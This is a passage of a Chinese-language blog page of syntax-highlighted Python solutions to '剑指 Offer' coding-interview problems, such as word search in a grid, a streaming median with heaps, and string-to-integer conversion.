dp[j]/<span class="number">6.0</span> <span class="comment">#之前的值和当前的值叠加</span></span><br><span class="line">            dp = tmp <span class="comment">#得到最新的值赋值给dp</span></span><br><span class="line">        <span class="keyword">return</span> dp</span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-12-矩阵中的路径-medium"><a href="#剑指-Offer-12-矩阵中的路径-medium" class="headerlink" title="剑指 Offer 12. 矩阵中的路径(medium)"></a>剑指 Offer 12. 矩阵中的路径(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exist</span><span class="params">(self, board, word)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type board: List[List[str]]</span></span><br><span class="line"><span class="string">        :type word: str</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">dfs</span><span class="params">(board,i,j,word,k)</span>:</span></span><br><span class="line">            <span class="comment">#判断下标是否越界</span></span><br><span class="line">            <span class="keyword">if</span> i&lt;<span class="number">0</span> <span class="keyword">or</span> i == len(board) <span class="keyword">or</span> j &lt; <span class="number">0</span> <span class="keyword">or</span> j == len(board[<span class="number">0</span>]):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="comment">#如果当前值和word当前值不相等，直接返回</span></span><br><span class="line">            <span class="keyword">if</span> board[i][j] != word[k]:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="comment">#如果访问到了word最后一个值，返回True</span></span><br><span class="line">            <span class="keyword">if</span> k == len(word)<span class="number">-1</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="comment">#先将当前值置空，防止后面重复访问</span></span><br><span class="line">            board[i][j] = <span class="string">''</span></span><br><span class="line">            res = dfs(board, i<span class="number">-1</span>, j, word, k+<span class="number">1</span>) <span class="keyword">or</span> dfs(board, i, j<span class="number">-1</span>, word, k+<span class="number">1</span>) \</span><br><span class="line">            <span class="keyword">or</span> dfs(board, i+<span class="number">1</span>, j, word, k+<span class="number">1</span>) <span class="keyword">or</span> dfs(board, i, j+<span class="number">1</span>, word, k+<span class="number">1</span>)</span><br><span class="line">            board[i][j] = word[k]</span><br><span class="line">            <span class="keyword">return</span> res</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(board)):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(len(board[i])):</span><br><span class="line">                <span class="keyword">if</span> dfs(board,i,j,word,<span class="number">0</span>):</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-41-数据流中的中位数-hard"><a href="#剑指-Offer-41-数据流中的中位数-hard" class="headerlink" title="剑指 Offer 41. 数据流中的中位数(hard)"></a>剑指 Offer 41. 数据流中的中位数(hard)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> heapq <span class="keyword">import</span> *</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MedianFinder</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 菜鸡的数组排序做法</span></span><br><span class="line">    <span class="comment"># def __init__(self):</span></span><br><span class="line">    <span class="comment">#     """</span></span><br><span class="line">    <span class="comment">#     initialize your data structure here.</span></span><br><span class="line">    <span class="comment">#     """</span></span><br><span class="line">    <span class="comment">#     self.res=[]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># def addNum(self, num):</span></span><br><span class="line">    <span class="comment">#     """</span></span><br><span class="line">    <span class="comment">#     :type num: int</span></span><br><span class="line">    <span class="comment">#     :rtype: None</span></span><br><span class="line">    <span class="comment">#     """</span></span><br><span class="line">    <span class="comment">#     self.res.append(num)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># def findMedian(self):</span></span><br><span class="line">    <span class="comment">#     """</span></span><br><span class="line">    <span class="comment">#     :rtype: float</span></span><br><span class="line">    <span class="comment">#     """</span></span><br><span class="line">    <span class="comment">#     self.res=sorted(self.res)</span></span><br><span class="line">    <span class="comment">#     if len(self.res)%2:</span></span><br><span class="line">    <span class="comment">#         return self.res[len(self.res)/2]</span></span><br><span class="line">    <span class="comment">#     else:</span></span><br><span class="line">    <span class="comment">#         return (self.res[len(self.res)/2-1]+self.res[len(self.res)/2])/2.0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#大佬的堆解法</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment">#heapq默认小顶堆</span></span><br><span class="line">        self.A = [] <span class="comment"># 小顶堆，保存较大的一半</span></span><br><span class="line">        <span class="comment">#实现大顶堆进堆的时候取相反数</span></span><br><span class="line">        self.B = [] <span class="comment"># 大顶堆，保存较小的一半</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">addNum</span><span class="params">(self, num)</span>:</span></span><br><span class="line">        <span class="comment"># 如果不相等，说明A多了一个</span></span><br><span class="line">        <span class="comment"># 把当前数存到A，调整堆之后，返回A中的最小值给B</span></span><br><span class="line">        <span class="keyword">if</span> len(self.A) != len(self.B):</span><br><span class="line">            heappush(self.B, -heappushpop(self.A, num))</span><br><span class="line">        <span class="comment"># 如果相等，就把当前数给B，调整堆之后，返回B中的最大值给A</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            heappush(self.A, -heappushpop(self.B, -num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">findMedian</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># 如果是奇数，直接返回A中的最小值</span></span><br><span class="line">        <span class="comment"># 如果是偶数，则返回两者堆顶的平均值</span></span><br><span class="line">        <span class="comment"># print(self.A)</span></span><br><span class="line">        <span class="comment"># print(self.B)</span></span><br><span class="line">        <span class="keyword">return</span> self.A[<span class="number">0</span>] <span class="keyword">if</span> len(self.A) != len(self.B) <span class="keyword">else</span> (self.A[<span class="number">0</span>] - self.B[<span class="number">0</span>]) / <span class="number">2.0</span></span><br><span class="line"></span><br><span class="line">            </span><br><span class="line"></span><br><span class="line"><span class="comment"># Your MedianFinder object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"># obj = MedianFinder()</span></span><br><span class="line"><span class="comment"># obj.addNum(num)</span></span><br><span class="line"><span class="comment"># param_2 = obj.findMedian()</span></span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-13-机器人的运动范围-medium"><a href="#剑指-Offer-13-机器人的运动范围-medium" class="headerlink" title="剑指 Offer 13. 机器人的运动范围(medium)"></a>剑指 Offer 13. 机器人的运动范围(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">movingCount</span><span class="params">(self, m, n, k)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type m: int</span></span><br><span class="line"><span class="string">        :type n: int</span></span><br><span class="line"><span class="string">        :type k: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">dfs</span><span class="params">(i,j,k)</span>:</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="number">0</span>&lt;= i &lt;m <span class="keyword">or</span> <span class="keyword">not</span> <span class="number">0</span>&lt;= j &lt;n <span class="keyword">or</span> (i,j) <span class="keyword">in</span> a <span class="keyword">or</span> (i%<span class="number">10</span>+i//<span class="number">10</span>+j%<span class="number">10</span>+j//<span class="number">10</span>)&gt;k: <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">            <span class="comment">#把这个点加入到访问集合中</span></span><br><span class="line">            a.add((i,j))</span><br><span class="line">            <span class="comment">#因为从（0,0）开始，所以只要向下走或向右走就行</span></span><br><span class="line">            dfs(i+<span class="number">1</span>,j,k)</span><br><span class="line">            dfs(i,j+<span class="number">1</span>,k) </span><br><span class="line">        a = set()</span><br><span class="line">        dfs(<span class="number">0</span>,<span class="number">0</span>,k)</span><br><span class="line">        <span class="keyword">return</span> len(a)</span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-44-数字序列中某一位的数字-medium"><a href="#剑指-Offer-44-数字序列中某一位的数字-medium" class="headerlink" title="剑指 Offer 44. 数字序列中某一位的数字(medium)"></a>剑指 Offer 44. 数字序列中某一位的数字(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">findNthDigit</span><span class="params">(self, n)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type n: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> n &lt; <span class="number">10</span>:</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        num = <span class="number">0</span></span><br><span class="line">        temp=<span class="number">0</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        如果n大于9的话，判断n应该在哪个区间</span></span><br><span class="line"><span class="string">        因为1位数一共有9个</span></span><br><span class="line"><span class="string">        2位数有90*2=180个</span></span><br><span class="line"><span class="string">        3位数有900*3=2700个</span></span><br><span class="line"><span class="string">        因此我们可以知道n位数有9*(10**(i-1)*i)个</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">while</span> n&gt;num:</span><br><span class="line">            temp = num <span class="comment">#temp保存上一个num的数</span></span><br><span class="line">            addnum = <span class="number">9</span>*(<span class="number">10</span>**i)*(i+<span class="number">1</span>)</span><br><span class="line">            num+=addnum</span><br><span class="line">            i+=<span class="number">1</span></span><br><span class="line">        res = n-temp <span class="comment">#减去区间之前的那些数</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        此时得到的i如果是3，则说明从三位数开始</span></span><br><span class="line"><span class="string">        可以得到区间在100-1000之间</span></span><br><span class="line"><span class="string">        从而算得起始的数是10**(3-1)=100</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        start_num = <span class="number">10</span>**(i<span class="number">-1</span>)</span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        因为在这个区间每一个数都是i位，因此我们得到除数div</span></span><br><span class="line"><span class="string">        对于三位数来讲，如果除数div=10，则可以得到数字是在100+10-1=109附近</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        div = res / i</span><br><span class="line">        mod = res % i</span><br><span class="line">        new_num = start_num + div - <span class="number">1</span> <span class="comment">#这个数字就是区间内加上除数之后的数字</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        进一步通过余数判断，如果余数为0，则说明当前得到的数字的最后一个数字就是结果</span></span><br><span class="line"><span class="string">        如果余数不为0，则说明最终结果在下一个数字，从而根据余数得到最终结果</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> mod == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> int(str(new_num)[<span class="number">-1</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> int(str(new_num+<span class="number">1</span>)[mod - i - <span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">        <span class="comment">#第一种方法，超时了</span></span><br><span class="line">        <span class="comment"># s=0</span></span><br><span class="line">        <span class="comment"># for i in range(n+1):</span></span><br><span class="line">        <span class="comment">#     s+=len(str(i))</span></span><br><span class="line">        <span class="comment">#     if s&gt;=n+1:</span></span><br><span class="line">        <span class="comment">#         return int(str(i)[n-temp])</span></span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-33-二叉搜索树的后序遍历序列-medium"><a href="#剑指-Offer-33-二叉搜索树的后序遍历序列-medium" class="headerlink" title="剑指 Offer 33. 二叉搜索树的后序遍历序列(medium)"></a>剑指 Offer 33. 二叉搜索树的后序遍历序列(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">verifyPostorder</span><span class="params">(self, postorder)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type postorder: List[int]</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> len(postorder) == <span class="number">1</span> <span class="keyword">or</span> (<span class="keyword">not</span> postorder):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        root = postorder[<span class="number">-1</span>] <span class="comment">#后序遍历最后一个值为根结点</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(postorder)): <span class="comment">#找到根节点右子树的第一个值</span></span><br><span class="line">            <span class="keyword">if</span> postorder[i]&gt;=root:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        left = postorder[:i] <span class="comment">#划分左子树</span></span><br><span class="line">        right = postorder[i:len(postorder)<span class="number">-1</span>] <span class="comment">#划分右子树</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> left: <span class="comment">#如果左子树中有小于根的，直接return </span></span><br><span class="line">            <span class="keyword">if</span> i&gt;root:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> right: <span class="comment">#如果右子树中有小于根的，直接return </span></span><br><span class="line">            <span class="keyword">if</span> i&lt;root:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        left = self.verifyPostorder(left) <span class="comment">#递归判断左子树</span></span><br><span class="line">        right = self.verifyPostorder(right) <span class="comment">#递归判断右子树</span></span><br><span class="line">        <span class="keyword">if</span> left <span class="keyword">and</span> right:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-16-数值的整数次方-medium"><a href="#剑指-Offer-16-数值的整数次方-medium" class="headerlink" title="剑指 Offer 16. 数值的整数次方(medium)"></a>剑指 Offer 16. 数值的整数次方(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">myPow</span><span class="params">(self, x, n)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type x: float</span></span><br><span class="line"><span class="string">        :type n: int</span></span><br><span class="line"><span class="string">        :rtype: float</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> n==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> n &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>/x * self.myPow(<span class="number">1</span>/x,-n<span class="number">-1</span>) </span><br><span class="line">        <span class="keyword">if</span> n%<span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> x * self.myPow(x*x,n/<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> n%<span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> self.myPow(x*x,n/<span class="number">2</span>)</span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-67-把字符串转换成整数-medium"><a href="#剑指-Offer-67-把字符串转换成整数-medium" class="headerlink" title="剑指 Offer 67. 把字符串转换成整数(medium)"></a>剑指 Offer 67. 把字符串转换成整数(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">strToInt</span><span class="params">(self, str)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type str: str</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        str = list(str.lstrip())  <span class="comment"># 去掉开头多余的空格</span></span><br><span class="line">        num = [<span class="string">'0'</span>, <span class="string">'1'</span>,<span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>, <span class="string">'7'</span>, <span class="string">'8'</span>, <span class="string">'9'</span>]</span><br><span class="line">        <span class="keyword">if</span> len(str)==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> len(str)==<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> str[<span class="number">0</span>] <span class="keyword">in</span> num:</span><br><span class="line">                <span class="keyword">return</span> int(str[<span class="number">0</span>])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; len(str):</span><br><span class="line">            <span class="keyword">if</span> str[i] != <span class="string">"-"</span> <span class="keyword">and</span> str[i] != <span class="string">"+"</span> <span class="keyword">and</span> str[i] <span class="keyword">not</span> <span class="keyword">in</span> num:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">            <span class="keyword">elif</span> str[i] == <span class="string">'-'</span> <span class="keyword">or</span> str[i] == <span class="string">'+'</span>: <span class="comment">#处理以‘-’和‘+’开头的</span></span><br><span class="line">                temp=str[i] <span class="comment">#保存‘+-’符号</span></span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> str[i] <span class="keyword">not</span> <span class="keyword">in</span> num:</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">while</span> i &lt; len(str):</span><br><span class="line">                        <span class="keyword">if</span> str[i] <span class="keyword">in</span> num:</span><br><span class="line">                            res *= <span class="number">10</span></span><br><span class="line">                            res += int(str[i])</span><br><span class="line">                            i += <span class="number">1</span></span><br><span class="line">                        <span class="keyword">else</span>: <span class="comment">#如果第i个字符不是数字直接退出</span></span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">if</span> temp == <span class="string">'-'</span>:</span><br><span class="line">                        <span class="keyword">if</span> res&gt;pow(<span class="number">2</span>,<span class="number">31</span>):</span><br><span class="line">                            <span class="keyword">return</span> -pow(<span class="number">2</span>,<span class="number">31</span>)</span><br><span class="line">                        <span class="keyword">return</span> -res</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">if</span> res&gt;pow(<span class="number">2</span>,<span class="number">31</span>)<span class="number">-1</span>:</span><br><span class="line">                            <span class="keyword">return</span> pow(<span class="number">2</span>,<span class="number">31</span>)<span class="number">-1</span></span><br><span class="line">                        <span class="keyword">return</span> res</span><br><span class="line">            <span class="keyword">elif</span> str[i] <span class="keyword">in</span> num: <span class="comment">#处理以字母开头的</span></span><br><span class="line">                <span class="keyword">while</span> i &lt; len(str):</span><br><span class="line">                        <span class="keyword">if</span> str[i] <span class="keyword">in</span> num:</span><br><span class="line">                            res *= <span class="number">10</span></span><br><span class="line">                            res += int(str[i])</span><br><span class="line">                            i += <span class="number">1</span></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> res&gt;pow(<span class="number">2</span>,<span class="number">31</span>)<span class="number">-1</span>:</span><br><span class="line">                    <span class="keyword">return</span> pow(<span class="number">2</span>,<span class="number">31</span>)<span class="number">-1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-46-把数字翻译成字符串-medium"><a href="#剑指-Offer-46-把数字翻译成字符串-medium" class="headerlink" title="剑指 Offer 46. 把数字翻译成字符串(medium)"></a>剑指 Offer 46. 把数字翻译成字符串(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">translateNum</span><span class="params">(self, num)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type num: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> num &lt; <span class="number">10</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> num%<span class="number">100</span>&lt;<span class="number">10</span> <span class="keyword">or</span> num%<span class="number">100</span>&gt;<span class="number">25</span>:</span><br><span class="line">            <span class="keyword">return</span> self.translateNum(num/<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> (self.translateNum(num/<span class="number">10</span>)+self.translateNum(num/<span class="number">100</span>))</span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-14-II-剪绳子-II-medium"><a href="#剑指-Offer-14-II-剪绳子-II-medium" class="headerlink" title="剑指 Offer 14- II. 剪绳子 II(medium)"></a>剑指 Offer 14- II. 剪绳子 II(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cuttingRope</span><span class="params">(self, n)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type n: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        尽可能分成长度为3的</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> n&lt;=<span class="number">3</span>:</span><br><span class="line">            <span class="keyword">return</span> n<span class="number">-1</span></span><br><span class="line">        res = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> n&gt;<span class="number">4</span>:</span><br><span class="line">            res*=<span class="number">3</span></span><br><span class="line">            n-=<span class="number">3</span></span><br><span class="line">        <span class="keyword">return</span> (res*n)% <span class="number">1000000007</span></span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-66-构建乘积数组-medium"><a href="#剑指-Offer-66-构建乘积数组-medium" 